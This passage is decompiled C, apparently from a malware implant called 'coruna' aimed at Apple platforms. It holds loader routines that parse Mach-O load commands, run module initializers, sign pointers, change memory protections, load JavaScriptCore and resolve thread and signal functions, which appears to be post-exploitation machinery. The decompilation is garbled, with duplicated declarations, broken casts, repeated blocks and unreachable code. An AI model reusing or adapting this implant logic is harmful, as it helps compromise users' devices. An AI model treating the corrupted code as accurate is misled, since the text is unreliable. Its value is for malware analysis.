       (off = *addr_2, *(int *)(off + 0x10) != 0)) {
      u = 0;
      handle = addr_2[10];
      addr = addr_2[0xb];
      err = (int *)(addr_2[0xd] + 0x20);
      do {
        if (*err == 0x19) {
          status = err + 0x12;
          flags = status + (unsigned long)(uint)err[0x10] * 0x14;
          if (status < flags) {
            do {
              if (((char)status[0x10] == '\n') && ((int)(*(unsigned long *)(status + 10) >> 3) != 0)) {
                base = *(long *)(status + 8);
                off = (*(unsigned long *)(status + 10) >> 3 & 0xffffffff) << 3;
                do {
                  ptr = *(void (**)((addr - handle) + base + -8 + off);
                  if (ptr < (void (*)addr_2[0xb] ||
                      (void (*)addr_2[0xb] + *(uint *)(addr_2 + 0x15) <= ptr) {
                    return &k_implant_rodata_word_12009;
                  }
                  err = coruna_return_zero();
                  if (err != 0) {
                    ptr = (void (*)coruna_pacia(ptr,0);
                  }
                  (*ptr)();
                  off = off + -8;
                } while (off != 0);
              }
              status = status + 0x14;
            } while (status < flags);
            off = *addr_2;
          }
        }
        err = (int *)((long)err + (unsigned long)(uint)err[1]);
        u = u + 1;
      } while (u < *(uint *)(off + 0x10));
    }
    if (addr_2[0xf] != 0) {
      (*(void (*)addr_2[0x13])(0,addr_2[0xb]);
    }
    ptr = (uint8_t *)0x1400b;
    err = coruna_driver_copy_port_1918(handle,addr_2[0xb],(int)addr_2[0x15],3);
    if (err != 0) goto fail;
    coruna_copy_bytes_cc70(addr_2[0xb],(int)addr_2[0x15]);
    if (addr_2[0xf] == 0) {
      u = *(uint *)(addr_2 + 0x15);
      if (*(char *)(handle + 0x5c5) == '\0') {
        if (*(void (**)(handle + 0xb0) == (void (*)0x0) goto done;
        err = (**(void (**)(handle + 0xb0))(handle,addr_2[0xb]);
      }
      else {
        off = 0;
        if ((u & 0x3fff) != 0) {
          off = 0x4000 - ((unsigned long)u & 0x3fff);
        }
        err = coruna_driver_copy_port_1918(handle,addr_2[0xb],off + (unsigned long)u,
                             *(uint32_t *)(handle + 0x5c8));
      }
      if (err != 0) {
        ptr = (uint8_t *)0x1400c;
        goto fail;
      }
    }
    else if ((*(char *)(handle + 0x5c5) != '\0') &&
            (err = coruna_driver_copy_port_1918(handle,addr_2[0xb],(int)addr_2[0x15],
                                  *(uint32_t *)(handle + 0x5c8)), err != 0)) goto fail;
  }
done:
  ptr = (uint8_t *)0x0;
fail:
  coruna_copy_bytes_cc70(addr_2,0x120);
  coruna_implant_via_driver_copy_port_1918(handle,addr_2,0x120);
  return ptr;
}





void coruna_dyld_cached_port_ptr(long handle,long addr_2,unsigned long arg)
{
  uint64_t scratch;
  
  for (scratch = 0; scratch < arg; scratch = scratch + 1) {
    *(uint8_t *)(handle + scratch) = *(uint8_t *)(addr_2 + scratch);
  }
  return;
}





long coruna_implant_residual_40(long handle,long addr_2,long off_3,unsigned long arg)
{
  bool err;
  char err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  bootargs = 0;
  do {
    if (addr_2 - arg <= bootargs) {
      err = '\x02';
fail:
      if (err != '\x01') {
        thread_attr = 0;
      }
      return thread_attr;
    }
    err = true;
    for (scratch = 0; scratch < arg; scratch = scratch + 4) {
      if (*(int *)(handle + bootargs + scratch) != *(int *)(off_3 + scratch)) {
        err = false;
        break;
      }
    }
    if (err) {
      thread_attr = handle + bootargs;
      err = '\x01';
      if (err != '\x01') {
      thread_attr = 0;
      }
      return thread_attr;
    }
    bootargs = bootargs + 4;
  } while( true );
}





void coruna_copy_bytes_cc70(long handle,unsigned long arg)
{
  uint64_t scratch;
  
  for (scratch = 0; scratch < arg; scratch = scratch + 1) {
    *(uint8_t *)(handle + scratch) = 1;
  }
  for (scratch = 0; scratch < arg; scratch = scratch + 1) {
    *(uint8_t *)(handle + scratch) = 0;
  }
  return;
}





uint32_t coruna_implant_residual_41(char *path,char *str_2)
{
  char err;
  char *scratch;
  char *bootargs;
  
  scratch = str_2;
  bootargs = path;
  do {
    err = *scratch;
    if (*bootargs != err) {
      return 1;
    }
    scratch = scratch + 1;
    bootargs = bootargs + 1;
  } while (err != '\0');
  return 0;
}





uint32_t coruna_return_zero_cd74(long handle,long addr_2,unsigned long arg)
{
  unsigned long scratch;
  
  scratch = 0;
  while( true ) {
    if (arg <= scratch) {
      return 0;
    }
    if (*(char *)(addr_2 + scratch) != *(char *)(handle + scratch)) break;
    if (*(char *)(addr_2 + scratch) == '\0') {
      return 0;
    }
    scratch = scratch + 1;
  }
  return 1;
}





int coruna_implant_residual_42(int flags)
{
  int err;
  int status;
  
  status = flags;
  if (0xe < flags) {
    status = 0xf;
  }
  err = 0;
  if (7 < flags) {
    err = ((flags - status) + 7U >> 3) + 1;
  }
  return err;
}





int coruna_nop_stub(int flags,int count_2)
{
  return flags * count_2;
}





void coruna_driver_dispatch(uint32_t size,uint32_t *flags_2,uint64_t val,uint64_t *id_2)
{
  if ((flags_2 != (uint32_t *)0x0) && (id_2 != (uint64_t *)0x0)) {
    *flags_2 = size;
    *id_2 = val;
  }
  return;
}





unsigned long coruna_implant08_via_implant_via_resolve_libcache_sym(int arg,long val,uint64_t n,uint64_t m)

{
  bool status;
  byte *ptr;
  uint type_id;
  byte flags;
  unsigned long port;
  byte *buf;
  uint type_id_11;
  unsigned long kind;
  unsigned long type_id_12;
  byte *str;
  byte *copy;
  unsigned long type_id_9;
  unsigned long type_id_10;
  long off;
  uint32_t type_id_13;
  unsigned long type_id_14;
  long base;
  unsigned long cache_34;
  uint cache_35;
  byte *cache_36;
  uint cache_33;
  uint *str;
  
  if (arg == 1) {
    copy = (byte *)(*(long *)(val + 0x68) +
                      (unsigned long)*(uint *)(*(long *)(val + 0x20) + 0x20));
    str = (uint *)(*(long *)(val + 0x20) + 0x24);
  }
  else {
    if (arg != 0) {
      return 0x910008;
    }
    copy = (byte *)(*(long *)(val + 0x68) +
                      (unsigned long)*(uint *)(*(long *)(val + 0x20) + 0x10));
    str = (uint *)(*(long *)(val + 0x20) + 0x14);
  }
  port = (unsigned long)*str;
  if (*str != 0) {
    type_id_10 = 0;
    off = 0;
    cache_35 = 0;
    type_id_14 = 0;
    cache_34 = 0;
    cache_36 = (byte *)0x0;
    base = 0;
    ptr = copy + port;
    cache_33 = 1;
    do {
      while( true ) {
        str = copy + 1;
        flags = *copy;
        type_id = flags & 0xf;
        port = (unsigned long)type_id;
        type_id_11 = (uint)(flags >> 4);
        copy = str;
        if (type_id_11 == 0xd) break;
        if (type_id_11 - 1 < 0xc) {
          type_id_13 = (uint32_t)type_id_14;
          switch(type_id_11) {
          default:
            type_id_14 = port;
            break;
          case 2:
            type_id_14 = 0;
            port = 0;
            buf = str;
            do {
              if (ptr <= buf) {
                type_id_14 = 0;
                copy = str;
                break;
              }
              copy = buf + 1;
              flags = *buf;
              type_id_9 = ((unsigned long)flags & 0x7f) << (port & 0x3f);
              if (0x3f < (uint)port) {
                type_id_9 = 0;
              }
              type_id_14 = type_id_9 | type_id_14;
              port = (unsigned long)((uint)port + 7);
              buf = copy;
            } while ((char)flags < '\0');
            break;
          case 3:
            type_id = 0;
            if ((flags & 0xf) != 0) {
              type_id = (int)(char)flags | 0xfffffff0;
            }
            type_id_14 = (unsigned long)type_id;
            break;
          case 4:
            buf = str;
            do {
              cache_35 = type_id;
              if (buf == ptr) {
                cache_36 = (byte *)0x0;
                copy = str;
                break;
              }
              flags = *buf;
              copy = buf + 1;
              buf = buf + 1;
              cache_36 = str;
            } while (flags != 0);
            break;
          case 5:
            cache_33 = type_id;
            break;
          case 6:
            cache_34 = 0;
            port = 0;
            buf = str;
            do {
              if (ptr <= buf) {
                cache_34 = 0;
                copy = str;
                goto load_ok_18;
              }
              copy = buf + 1;
              flags = *buf;
              type_id_9 = ((unsigned long)flags & 0x7f) << (port & 0x3f);
              if (0x3f < (uint)port) {
                type_id_9 = 0;
              }
              cache_34 = type_id_9 | cache_34;
              port = (unsigned long)((uint)port + 7);
              buf = copy;
            } while ((char)flags < '\0');
            if ((flags & 0x40) != 0) {
              cache_34 = 0xffffffffffffffff;
            }
            break;
          case 7:
            base = coruna_implant_residual_43(port,val);
            if (base == 0) {
              return 0x910009;
            }
            port = 0;
            type_id_9 = 0;
            buf = str;
            do {
              if (ptr <= buf) {
                port = 0;
                copy = str;
                break;
              }
              copy = buf + 1;
              flags = *buf;
              kind = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
              if (0x3f < (uint)type_id_9) {
                kind = 0;
              }
              port = kind | port;
              type_id_9 = (unsigned long)((uint)type_id_9 + 7);
              buf = copy;
            } while ((char)flags < '\0');
            base = base + port;
            break;
          case 8:
            port = 0;
            type_id_9 = 0;
            buf = str;
            do {
              if (ptr <= buf) {
                port = 0;
                copy = str;
                break;
              }
              copy = buf + 1;
              flags = *buf;
              kind = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
              if (0x3f < (uint)type_id_9) {
                kind = 0;
              }
              port = kind | port;
              type_id_9 = (unsigned long)((uint)type_id_9 + 7);
              buf = copy;
            } while ((char)flags < '\0');
            base = base + port;
            break;
          case 9:
            port = coruna_implant_via_resolve_libcache_sym(base,cache_36,cache_35,cache_33,cache_34,n,m,val,
                                 type_id_13);
            if ((int)port != 0) {
              return port;
            }
            base = base + 8;
            break;
          case 10:
            port = coruna_implant_via_resolve_libcache_sym(base,cache_36,cache_35,cache_33,cache_34,n,m,val,
                                 type_id_13);
            if ((int)port != 0) {
              return port;
            }
            port = 0;
            type_id_9 = 0;
            buf = str;
            do {
              if (ptr <= buf) {
                port = 0;
                copy = str;
                break;
              }
              copy = buf + 1;
              flags = *buf;
              kind = ((unsigned long)flags & 0x7f) << (type_id_9 & 0x3f);
              if (0x3f < (uint)type_id_9) {
                kind = 0;
              }
              port = kind | port;
              type_id_9 = (unsigned long)((uint)type_id_9 + 7);
              buf = copy;
            } while ((char)flags < '\0');
            base = port + base + 8;
            break;
          case 0xb:
            type_id_9 = coruna_implant_via_resolve_libcache_sym(base,cache_36,cache_35,cache_33,cache_34,n,m,val
                                  ,type_id_13);
            if ((int)type_id_9 != 0) {
              return type_id_9;
            }
            port = coruna_nop_stub(port,8);
            base = base + (port & 0xffffffff) + 8;
            break;
          case 0xc:
            type_id_9 = 0;
            port = 0;
            do {
              if (ptr <= copy) {
                type_id_9 = 0;
                buf = str;
                break;
              }
              buf = copy + 1;
              flags = *copy;
              kind = ((unsigned long)flags & 0x7f) << (port & 0x3f);
              if (0x3f < (uint)port) {
                kind = 0;
              }
              type_id_9 = kind | type_id_9;
              port = (unsigned long)((uint)port + 7);
              copy = buf;
            } while ((char)flags < '\0');
            port = 0;
            kind = 0;
            str = buf;
            do {
              if (ptr <= str) {
                port = 0;
                copy = buf;
                break;
              }
              copy = str + 1;
              flags = *str;
              type_id_12 = ((unsigned long)flags & 0x7f) << (kind & 0x3f);
              if (0x3f < (uint)kind) {
                type_id_12 = 0;
              }
              port = type_id_12 | port;
              kind = (unsigned long)((uint)kind + 7);
              str = copy;
            } while ((char)flags < '\0');
            if (type_id_9 != 0) {
              kind = 1;
              do {
                type_id_12 = coruna_implant_via_resolve_libcache_sym(base,cache_36,cache_35,cache_33,cache_34,n,m,
                                      val,type_id_13);
                if ((int)type_id_12 != 0) {
                  return type_id_12;
                }
                base = base + port + 8;
                status = kind < type_id_9;
                kind = (unsigned long)((int)kind + 1);
              } while (status);
            }
          }
        }
load_ok_18:
        if (ptr <= copy) {
          if (off != 0) {
            coruna_implant_via_driver_copy_port_1918(m,off,(type_id_10 & 0xffffffff) << 3);
          }
          goto load_ok_19;
        }
      }
      if ((flags & 0xf) != 0) {
        if (type_id != 1) {
          return 0x91000d;
        }
        if (off == 0) {
          return 0x910018;
        }
        port = coruna_return_zero_e2dc(val,base,off,type_id_10);
        if ((int)port != 0) {
          return port;
        }
        goto load_ok_18;
      }
      type_id_9 = 0;
      buf = str;
      do {
        if (ptr <= buf) {
          type_id_9 = 0;
          copy = str;
          goto joined_r0x0000cf90;
        }
        copy = buf + 1;
        flags = *buf;
        kind = ((unsigned long)flags & 0x7f) << (port & 0x3f);
        if (0x3f < (uint)port) {
          kind = 0;
        }
        type_id_9 = kind | type_id_9;
        port = (unsigned long)((uint)port + 7);
        buf = copy;
      } while ((char)flags < '\0');
      if (type_id_9 >> 0x10 != 0) {
        return 0x91000f;
      }
joined_r0x0000cf90:
      if (off != 0) {
        coruna_implant_via_driver_copy_port_1918(m,off,(type_id_10 & 0xffffffff) << 3);
        type_id_10 = 0;
      }
      if (type_id_9 != 0) {
        off = coruna_implant_via_driver_copy_port_1918_2(m,type_id_9 << 3,0);
        if (off == 0) {
          return 0xad009;
        }
        coruna_copy_bytes_cc70(off,type_id_9 << 3);
        type_id_10 = type_id_9;
        base = off;
        goto load_ok_18;
      }
      off = 0;
      base = 0;
    } while (copy < ptr);
load_ok_19:
    port = 0;
  }
  return port;
}





int coruna_load_javascriptcore(long handle,uint64_t *val)
{
  int *err;
  uint8_t *ptr;
  uint u;
  int err;
  bool err;
  int status;
  long handle;
  int *status;
  int *flags;
  void (*ptr)(void);
  unsigned long size;
  int *count;
  long addr;
  uint64_t version;
  uint port;
  long off;
  long base;
  int scratch;
  uint64_t bootargs[2];
  void (*thread_attr)(void);
  uint64_t host_info;
  
  if (handle == 0) {
    return 0xad001;
  }
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (*(char *)((long)val + 0x5c7) == '\0') {
    return 0;
  }
  off = val[0xbb];
  if (off == 0) {
    return 0xad001;
  }
  if (val[0xba] == 0) {
    return 0xad001;
  }
  u = *(uint *)(handle + 0xa8);
  base = *(long *)(handle + 0x58);
  handle = (*(void (*)*val)("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",1
                             );
  if (handle == 0) {
    return 0x1200b;
  }
  status = (int *)(*(void (*)val[1])(handle,"JSEvaluateScript");
  (*(void (*)val[3])(handle);
  version = k_implant_rodata_word_26a20;
  if (status == (int *)0x0) {
    return 0x12001;
  }
  handle = 0;
  status = 0;
  base = base - off;
  scratch = 0x15003;
  thread_attr = k_implant_rodata_word_26a30;
  host_info = coruna_u64_pack((host_info), (k_implant_rodata_word_26a38));
  err = status + 0x300000;
  do {
    if (status != (int *)0x0 && status < err) {
      flags = status;
      while (flags = (int *)coruna_implant_residual_40(flags,(long)err - (long)flags,
                                          (long)&thread_attr + handle * 4,4), flags != (int *)0x0) {
        bootargs[0] = version;
        off = coruna_implant_residual_40(flags,0x1000,bootargs,8);
        if (off != 0) {
          if (handle == 0) {
            handle = (*(void (*)*val)("/usr/lib/system/libsystem_c.dylib",1);
            if (handle == 0) {
              return 0x1200b;
            }
            ptr = (void (*)(*(void (*)val[1])(handle,"sigaction");
            (*(void (*)val[3])(handle);
            if (ptr == (void (*)0x0) {
              return 0x12001;
            }
            handle = coruna_mmap(0,0x8000,3,&k_implant_mmap_anon_fd,0,0);
            if (handle == -1) {
              return 0x15001;
            }
            status = *(int *)(val + 0x1c);
            if (((status == -0x789a1216) || (status == -0x25cc27c3)) || (status == 0x2876f5b5)) {
              version = 0xb;
              err = true;
            }
            else {
              status = coruna_mprotect(handle + 0x4000,0x4000,0);
              if (status != 0) {
                scratch = 0x15002;
                coruna_munmap(handle,0x8000);
                return scratch;
              }
              err = false;
              version = 10;
            }
            coruna_copy_bytes_cc70(&thread_attr,0x10);
            thread_attr = coruna_objc_nsobject_pair;
            host_info = k_implant_rodata_word_26a28;
            status = (*ptr)(version,&thread_attr,bootargs);
            coruna_munmap(handle,0x8000);
            return scratch;
            ptr = &k_implant_ctx_slot_tertiary;
            if (err) {
              addr = 0;
            }
            else {
              ptr = &k_implant_ctx_slot_primary;
              addr = val[0xba];
            }
            *(long *)(handle + 0x330) = off;
            *(uint64_t *)(handle + 0x338) = val[0xba];
            scratch = 0;
            size = 0;
            off = val[0xba];
            do {
            status = *(int *)(val[0xbb] + base + size);
            if (status != *(int *)(off + base + size)) {
            coruna_driver_dispatch(status,addr + base + size,ptr,handle);
            off = val[0xba];
            if (status != *(int *)(off + base + size)) {
            scratch = 0x15005;
            status = (*ptr)(version,bootargs,0);
            if (status != 0) {
            scratch = 0x15003;
            }
            }
            }
            size = size + 4;
            } while (size < u);
            scratch = 0;
          }
          size = 0;
          count = flags;
          do {
            if (count[-1] == -0x2efebc01) {
              if (*count == -0x56fda80a) {
                if ((flags[2] & 0xffc001e0U) == 0xb90001e0) {
                  port = (uint)flags[2] >> 8 & 0x3ffc;
                  status = 3;
check_ok:
                  if (u == 0) {
                    return 0;
                  }
                  size = 0;
                  handle = val[0xba];
                  do {
                    err = *(int *)(val[0xbb] + base + size);
                    status = (int *)(handle + base + size);
                    if (err != *status) {
                      if (status - 1U < 4) {
                        switch(status) {
                        default:
                          coruna_implant_indirect_call0(off,err);
                          break;
                        case 2:
                          coruna_implant_indirect_call4_c(off,err,status,port);
                          break;
                        case 3:
                          coruna_implant_indirect_call4(off,err,status,port);
                          break;
                        case 4:
                          coruna_dyld_port_index(off,err,status,port);
                        }
                      }
                      handle = val[0xba];
                      if (err != *(int *)(handle + base + size)) {
                        return 0x15005;
                      }
                    }
                    size = size + 4;
                    if (u <= size) {
                      return 0;
                    }
                  } while( true );
                }
                break;
              }
              if (*count == -0x56fea008) {
                if ((flags[2] & 0xffc001e0U) == 0xb90001e0) {
                  port = (uint)flags[2] >> 8 & 0x3ffc;
                  status = 2;
                  goto check_ok;
                }
                break;
              }
            }
            else if (count[-1] == -0x2efefc01) {
              if (*count == -0x56fea80a) {
                port = 0;
                status = 1;
                goto check_ok;
              }
              if (*count == -0x56fdb00c) {
                if ((flags[2] & 0xffc001e0U) == 0xb90001e0) {
                  port = (uint)flags[2] >> 8 & 0x3ffc;
                  status = 4;
                  goto check_ok;
                }
                break;
              }
            }
            size = size + 4;
            count = count + -1;
          } while (size < 0xed);
        }
        flags = flags + 1;
        if ((err <= flags) || (flags == (int *)0x0)) break;
      }
      status = 0x15004;
    }
    handle = handle + 1;
    if (handle == 3) {
      if (status != 0) {
        return status;
      }
      return 0x15006;
    }
  } while( true );
cleanup:
  do {
    status = *(int *)(val[0xbb] + base + size);
    if (status != *(int *)(off + base + size)) {
      coruna_driver_dispatch(status,addr + base + size,ptr,handle);
      off = val[0xba];
      if (status != *(int *)(off + base + size)) {
        scratch = 0x15005;
        status = (*ptr)(version,bootargs,0);
        if (status != 0) {
        scratch = 0x15003;
        }
      }
    }
    size = size + 4;
  } while (size < u);
done:
  scratch = 0;
skip:
  status = (*ptr)(version,bootargs,0);
  if (status != 0) {
    scratch = 0x15003;
  }
fail:
  coruna_munmap(handle,0x8000);
  return scratch;
}





void coruna_implant_via_driver_copy_port_1918(long handle,uint64_t val,unsigned long arg)
{
  long handle;
  
  if (*(char *)(handle + 0x5c5) != '\0') {
    handle = 0;
    if ((arg & 0x3fff) != 0) {
      handle = 0x4000 - (arg & 0x3fff);
    }
    coruna_driver_copy_port_1918(handle,val,handle + arg,*(uint32_t *)(handle + 0x5c8));
    return;
  }
  if (*(void (**)(handle + 0xb0) != (void (*)0x0) {
    (**(void (**)(handle + 0xb0))();
    return;
  }
  return;
}





unsigned long coruna_implant_via_driver_copy_port_1918_2(long arg,unsigned long val,unsigned long n)

{
  long ctx_val;
  int status;
  unsigned long type_id;
  unsigned long version;
  
  version = val;
  if ((*(char *)(arg + 0x5c2) == '\0') &&
     (((n & 1) != 0 || (*(char *)(arg + 0x5c5) != '\0')))) {
    version = val + 0x4000;
  }
  while (type_id = (**(void (**)(arg + 0x28))(arg,version), type_id == 0) {
    if ((*(void (**)(arg + 0x128) == (void (*)0x0) ||
       (status = (**(void (**)(arg + 0x128))(arg,version), status != 0)) {
      return -(n & 1);
    }
  }
  if (*(char *)(arg + 0x5c2) != '\0') {
    return type_id;
  }
  if ((((n & 1) != 0) || (*(char *)(arg + 0x5c5) != '\0')) && ((type_id & 0x3fff) != 0)) {
    type_id = type_id + 0x4000 & 0xffffffffffffc000;
  }
  if (*(char *)(arg + 0x5c5) == '\0') {
    return type_id;
  }
  ctx_val = 0;
  if ((val & 0x3fff) != 0) {
    ctx_val = 0x4000 - (val & 0x3fff);
  }
  status = coruna_driver_copy_port_1918(arg,type_id,ctx_val + val,3);
  if (status == 0) {
    return type_id;
  }
  return -(n & 1);
}





uint64_t coruna_driver_copy_port_1918(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint64_t u;
  
  if (*(char *)(handle + 0x5c5) == '\0') {
    if ((((*(char *)(handle + 0x5c1) == '\0') || (*(char *)(handle + 0x5c4) != '\0')) ||
        (*(char *)(handle + 0x5c7) != '\0')) || (((uint)size_3 >> 2 & 1) != 0)) {
      return 0;
    }
    size_3 = 3;
  }
  u = coruna_mprotect(val,id_2,size_3);
  return u;
}





uint64_t coruna_find_mod_init_func(long *handle,unsigned long arg,long *addr_2)
{
  long handle;
  long addr;
  int err;
  uint64_t u;
  unsigned long size;
  uint version;
  int *err;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (addr_2 != (long *)0x0)) {
    if (*(int *)(*handle + 0x10) != 0) {
      version = 0;
      handle = handle[10];
      addr = handle[0xb];
      err = (int *)(handle[0xd] + 0x20);
      do {
        if ((((*err == 0x19) && (*(long *)(err + 0xc) != 0)) &&
            (err = coruna_return_zero_cd74(err + 2,"__PAGEZERO",0xb), err != 0)) &&
           ((*(unsigned long *)(err + 10) <= arg &&
            (size = arg - *(unsigned long *)(err + 10), size < *(unsigned long *)(err + 0xc))))) {
          *addr_2 = (addr - handle) + size + *(long *)(err + 6);
          return 0;
        }
        err = (int *)((long)err + (unsigned long)(uint)err[1]);
        version = version + 1;
      } while (version < *(uint *)(*handle + 0x10));
    }
    u = 0xad011;
  }
  return u;
}





uint64_t
uint64_t coruna_resolve_libcache_sym(int64_t arg,int64_t arg,uint64_t *val,uint64_t *id_2,uint size)
{
  uint u;
  uint size;
  bool err;
  int err;
  long handle;
  uint64_t version;
  uint port;
  uint64_t scratch;
  
  if (((((arg != 0) && (arg != 0)) && (val != (uint64_t *)0x0)) &&
      ((id_2 != (uint64_t *)0x0 && (size != 0)))) && (size != 0xfffffffe)) {
    if (size == 0xffffffff) {
      handle = -5;
    }
    else if ((((int)size < 1) || (*(uint *)(arg + 0x200) < size)) ||
            handle = (*(void (*)*val)("/usr/lib/system/libcache.dylib",0x12);
            if (handle != 0) {
            err = coruna_resolve_pthread_create(handle,arg,val,&scratch);
            (*(void (*)val[3])(handle);
            *id_2 = scratch;
            return 0;
            }
            u = *(uint *)(arg + 0x204);
            size = *(uint *)(arg + 0x200);
            port = u;
            if (size <= u) {
            port = 0;
            }
            if (port < size) {
            err = u < size;
            do {
            handle = *(long *)(arg + (unsigned long)port * 8);
            if ((handle != 0) && (err = coruna_resolve_pthread_create(handle,arg,val,&scratch), err == 0)) {
            *(uint *)(arg + 0x204) = port;
            *id_2 = scratch;
            return 0;
            }
            if (err) {
            port = (uint)(port == 0);
            *(uint32_t *)(arg + 0x204) = 0;
            }
            else {
            port = port + 1;
            }
            err = false;
            } while (port < *(uint *)(arg + 0x200));
            }
            err = coruna_implant_residual_41(arg,"dyld_stub_binder");
            if (err == 0) {
            scratch = 0xdeadbeef;
            }
            else {
            err = coruna_implant_residual_41(arg,"__objc_empty_vtable");
            if ((err != 0) && (err = coruna_implant_residual_41(arg,"_objc_readClassPair"), err != 0)) {
            return 0x910006;
            }
            scratch = 0;
            }
            *id_2 = scratch;
            return 0;
    version = coruna_resolve_pthread_create(handle,arg,val,id_2);
    if ((int)version == 0) {
      return version;
    }
  }
fail:
  handle = (*(void (*)*val)("/usr/lib/system/libcache.dylib",0x12);
  if (handle != 0) {
    err = coruna_resolve_pthread_create(handle,arg,val,&scratch);
    (*(void (*)val[3])(handle);
    *id_2 = scratch;
    return 0;
  }
  u = *(uint *)(arg + 0x204);
  size = *(uint *)(arg + 0x200);
  port = u;
  if (size <= u) {
    port = 0;
  }
  if (port < size) {
    err = u < size;
    do {
      handle = *(long *)(arg + (unsigned long)port * 8);
      if ((handle != 0) && (err = coruna_resolve_pthread_create(handle,arg,val,&scratch), err == 0)) {
        *(uint *)(arg + 0x204) = port;
        *id_2 = scratch;
        return 0;
      }
      if (err) {
        port = (uint)(port == 0);
        *(uint32_t *)(arg + 0x204) = 0;
      }
      else {
        port = port + 1;
      }
      err = false;
    } while (port < *(uint *)(arg + 0x200));
  }
  err = coruna_implant_residual_41(arg,"dyld_stub_binder");
  if (err == 0) {
    scratch = 0xdeadbeef;
  }
  else {
    err = coruna_implant_residual_41(arg,"__objc_empty_vtable");
    if ((err != 0) && (err = coruna_implant_residual_41(arg,"_objc_readClassPair"), err != 0)) {
      return 0x910006;
    }
    scratch = 0;
  }
done:
  *id_2 = scratch;
  return 0;
}





uint64_t coruna_resolve_pthread_create(uint64_t val,char *path,uint64_t *id_2,long *handle)
{
  int err;
  long handle;
  long addr;
  long off;
  
  (*(void (*)id_2[4])();
  if ((*(char *)(id_2 + 0xb8) == '\0') ||
     (err = coruna_implant_residual_41(path,"_pthread_create"), err != 0)) {
    if (*path == '_') {
      path = path + 1;
    }
    handle = (*(void (*)id_2[1])(val,path);
    (*(void (*)id_2[4])();
    *handle = handle;
    if (handle != 0) {
      return 0;
    }
  }
  else {
    handle = k_implant_rodata_word_2c050;
    off = k_implant_rodata_word_2c058;
    addr = k_implant_rodata_word_2c788;
    if (((k_implant_rodata_word_2c050 != 0 && k_implant_rodata_word_2c058 != 0) && k_implant_rodata_word_2c788 != 0) ||
       ((((handle = (*(void (*)*id_2)("/usr/lib/system/libsystem_pthread.dylib",0x10), handle != 0
          && (handle = (*(void (*)id_2[1])(handle,"pthread_create"), handle != 0)) &&
         (addr = (*(void (*)*id_2)("/usr/lib/system/libsystem_c.dylib",0x10), addr != 0)) &&
        ((off = (*(void (*)id_2[1])(addr,"malloc"), off != 0 &&
         (addr = (*(void (*)id_2[1])(addr,"free"), addr != 0)))))) {
      k_implant_rodata_word_2c788 = addr;
      k_implant_rodata_word_2c058 = off;
      k_implant_rodata_word_2c050 = handle;
      *handle = (long)coruna_implant08_via_copy_bytes_cc70;
      return 0;
    }
    *handle = 0;
  }
  return 0x910006;
}





uint64_t coruna_implant08_via_copy_bytes_cc70(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  void (*ptr)(void);
  void (*buf)(void);
  uint64_t *ptr;
  uint64_t u;
  
  buf = k_implant_rodata_word_2c788;
  ptr = k_implant_rodata_word_2c050;
  if ((k_implant_rodata_word_2c050 == (void (*)0x0 || k_implant_rodata_word_2c058 == (void (*)0x0) || k_implant_rodata_word_2c788 == (void (*)0x0) {
    u = 0x16;
  }
  else {
    ptr = (uint64_t *)(*k_implant_rodata_word_2c058)(0x10);
    if (ptr == (uint64_t *)0x0) {
      u = 0xc;
    }
    else {
      *ptr = size_3;
      ptr[1] = off_4;
      u = (*ptr)(val,id_2,coruna_implant_via_copy_bytes_cc70_3,ptr);
      if ((int)u != 0) {
        coruna_copy_bytes_cc70(ptr,0x10);
        (*buf)(ptr);
      }
    }
  }
  return u;
}





uint64_t coruna_implant_via_copy_bytes_cc70_3(long *handle)
{
  void (*ptr)(void);
  uint64_t u;
  
  ptr = k_implant_rodata_word_2c788;
  if ((handle == (long *)0x0) || (*handle == 0)) {
    u = 0;
  }
  else {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
    u = (*(void (*)*handle)(handle[1]);
    coruna_copy_bytes_cc70(handle,0x10);
    if (ptr != (void (*)0x0) {
      (*ptr)(handle);
    }
  }
  return u;
}





uint64_t
uint64_t coruna_return_zero_e120(int64_t arg,int64_t arg,uint64_t val,int64_t val,int flags,uint size)
{
  unsigned long u;
  short ls2;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  uint64_t tag;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  
  size = 0xad001;
  if ((arg != 0) && (arg != 0)) {
    scratch = 0;
    size = coruna_find_mod_init_func(arg,*(long *)(arg + 8) + (unsigned long)size +
                                 (unsigned long)((uint)*(ushort *)(arg + 4) * flags),&scratch);
    if ((int)size == 0) {
      tag = 0x920006;
      ls2 = *(short *)(arg + 6);
      if ((ls2 == 6) || (ls2 == 2)) {
        size = 0xad001;
        if ((scratch != 0) &&
           ((size = tag, *(unsigned long *)(arg + 0x58) <= scratch &&
            (port = scratch,
            scratch < *(unsigned long *)(arg + 0x58) + (unsigned long)*(uint *)(arg + 0xa8))))) {
          do {
            thread_attr = 0;
            coruna_dyld_cached_port_ptr(&bootargs,port,8);
            if ((long)bootargs < 0) {
              if ((uint)val <= ((uint)bootargs & 0xffffff)) {
                return 0x920001;
              }
              thread_attr = *(long *)(val + (bootargs & 0xffffff) * 8) + (bootargs >> 0x18 & 0xff);
            }
            else {
              u = bootargs & 0xfffffffff | (bootargs >> 0x24) << 0x38;
              if (ls2 == 2) {
                thread_attr = (u + *(long *)(arg + 0x60)) - *(long *)(arg + 0x50);
              }
              else {
                thread_attr = u + *(long *)(arg + 0x60);
              }
            }
            coruna_dyld_cached_port_ptr(port,&thread_attr,8);
            if ((bootargs >> 0x33 & 0xfff) == 0) {
              return 0;
            }
            port = port + (((uint)(bootargs >> 0x33) & 0xfff) << 2);
            version = *(unsigned long *)(arg + 0x58);
            u = version + *(uint *)(arg + 0xa8);
          } while ((port >= version && port <= u) && (port < version || u != port));
        }
      }
      else if (ls2 == 1) {
        size = coruna_return_zero_e2dc(arg,scratch,val,val);
      }
      else {
        size = 0x920005;
      }
    }
  }
  return size;
}





uint64_t coruna_return_zero_e2dc(long handle,unsigned long *arg,long addr_2,uint size)
{
  unsigned long *ptr;
  unsigned long u;
  long handle;
  unsigned long size;
  
  do {
    size = *arg;
